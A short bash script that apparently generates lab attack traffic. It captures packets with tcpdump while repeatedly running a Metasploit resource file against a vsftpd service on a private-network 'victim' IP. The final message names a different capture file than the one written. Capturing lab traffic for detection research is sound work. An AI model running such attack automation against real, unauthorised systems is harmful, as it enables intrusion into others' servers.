#!/bin/bash

# Configuration
VICTIM_IP="192.168.113.130"      
NUM_ATTACKS=5            
INTERFACE="eth0"           

echo "[*] Starting vsftpd attack automation"
echo "[*] Target: $VICTIM_IP"
echo "[*] Attacks: $NUM_ATTACKS"
echo "========================================"

# Start packet capture
echo "[*] Starting packet capture..."
sudo tcpdump -i $INTERFACE host $VICTIM_IP -w attack_traffic123.pcap &
TCPDUMP_PID=$!
echo "[+] Capture started (PID: $TCPDUMP_PID)"
sleep 3    # Keep this ONE - gives tcpdump time to start

# Run attacks - NO SLEEP between attacks!
for i in $(seq 1 $NUM_ATTACKS); do
    echo "[*] Attack $i/$NUM_ATTACKS"
    msfconsole -q -r ~/vsftpd_exploit.rc
done

# Stop capture
echo "[*] Stopping capture..."
sudo kill $TCPDUMP_PID
sleep 1    # Keep this ONE - gives tcpdump time to finish writing
echo "[+] Done! Check attack_traffic.pcap"
